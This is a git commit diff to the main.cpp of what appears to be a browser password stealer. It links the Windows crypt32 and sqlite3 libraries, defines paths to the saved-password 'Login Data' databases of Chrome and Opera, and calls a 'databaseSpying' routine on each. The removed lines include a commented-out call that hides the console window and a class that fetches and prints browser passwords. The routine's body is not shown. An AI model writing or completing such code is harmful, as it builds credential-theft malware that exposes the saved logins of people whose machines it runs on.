6fff730ab540e9084fd66b2e15cf8a1674b8f534
Valentin Nasraty <valentin.nasraty@epitech.eu>
2018-11-11 11:06:22 +0100

    Update main.cpp

--- src/main.cpp
+++ src/main.cpp
@@ -1,12 +1,20 @@
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "sqlite3.lib")
 
-#include "BrowserPassword.hh"
+#include <iostream>
+#include <string>
+#include <Windows.h>
+#include <ShlObj.h>
 
-int			main(int ac, char **av)
+# define C_DBFILE "\\Google\\Chrome\\User Data\\Default\\Login Data" 
+# define C_REGKEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
+
+# define O_DBFILE "\\Opera Software\\Opera Stable\\Login Data" 
+# define O_REGKEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"  
+
+int main(int ac, const char **av) 
 {
-	// ShowWindow(GetConsoleWindow(), SW_HIDE); /* HIDE CONSOLE */
-	BrowserPassword	browser;
-	
-	browser.getBrowserPassword();
-	browser.printPassword();
+	databaseSpying(C_DBFILE, C_REGKEY, CSIDL_LOCAL_APPDATA); // Chrome 
+	databaseSpying(O_DBFILE, O_REGKEY, CSIDL_APPDATA); // Opera 
 	return (0);
 }
